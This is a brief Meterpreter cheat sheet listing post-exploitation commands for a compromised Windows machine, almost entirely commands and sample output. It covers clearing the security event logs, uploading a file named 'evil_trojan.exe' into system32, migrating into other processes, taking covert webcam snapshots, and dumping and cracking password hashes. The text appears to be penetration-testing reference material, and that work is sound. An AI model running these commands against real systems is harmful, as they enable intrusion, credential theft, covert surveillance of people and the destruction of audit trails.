# Meterpreter

## navigating

```bash
#Meterpreter commands
meterpreter > background
meterpreter > cat edit.txt
meterpreter > cd c:\windows
meterpreter > ls
meterpreter > lpwd
meterpreter > lcd MSFU

```

## shell

`meterpreter > shell`

## Clear app,sys,security logs on windows

`meterpreter > clearev`

## download/upload

```text
meterpreter > download c:\\boot.ini
meterpreter > upload evil_trojan.exe c:\\windows\\system32
```

## Migrate to process

```text
meterpreter > run post/windows/manage/migrate 
meterpreter > ps
meterpreter > migrate <pid>
```

## Run commands in script

```bash
cat resource.txt
ls
background

meterpreter > resource resource.txt
#[*] Reading /root/resource.txt[*] Running ls
#..
#..
#[*] Backgrounding session 1...

```

## Search files

```bash
meterpreter > search -h
meterpreter > search -f *.jpg
meterpreter > search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.p
```

## Web Cam

```bash
meterpreter > webcam_list
meterpreter > webcam_snap -h
meterpreter > webcam_snap -i 1 -v false
```

## John The Ripper

```bash
msf auxiliary(handler) > use post/windows/gather/hashdumpmsf post(hashdump) > set session 1
msf post(hashdump) > run
msf post(hashdump) > use auxiliary/analyze/jtr_crack_fast
msf auxiliary(jtr_crack_fast) > run
#[+] Cracked: Guest: (192.168.184.134:445)
#[+] Cracked: rAWjAW2:password (192.168.184.134:445)
```

## Netcat connect

```bash
msf > connect 192.168.1.1 23
meterpreter > search -f autoexec.bat
meterpreter > search -f sea*.bat c:\\xamp\\
```



